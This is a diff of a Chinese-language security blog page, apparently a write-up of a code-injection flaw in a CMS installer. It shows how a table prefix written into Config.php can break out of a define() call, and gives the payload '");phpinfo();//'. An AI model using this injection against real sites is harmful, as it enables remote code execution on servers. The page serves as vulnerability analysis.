@@ -59,12 +59,12 @@
 
 <h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p><img src="/uploads/2019/03/2856314297.png" alt="de5.png"></p>
 <p>可以看到这个<code>Config.php</code>文件中，定义了一个常量，这个常量的值就是安装CMS的时候填写的表前缀。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&quot;TABLE_PRE&quot;,&quot;sky_&quot;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">define</span></span>(<span class="string">"TABLE_PRE"</span>,<span class="string">"sky_"</span>);</span><br></pre></td></tr></table></figure>
 
 <p>这段代码，我们怎么让它代码执行？</p>
 <p>是不是立马能想到让它闭合+注释就可以做到？</p>
 <p>构造完的代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&quot;TABLE_PRE&quot;,&quot;&quot;);phpinfo();//sky_&quot;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">define</span></span>(<span class="string">"TABLE_PRE"</span>,<span class="string">""</span>);phpinfo();<span class="comment">//sky_");</span></span><br></pre></td></tr></table></figure>
 
 <p>那么，payload就是：<code>&quot;);phpinfo();//</code></p>
 <h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p><img src="/uploads/2019/03/885568156.png" alt="de.png"></p>
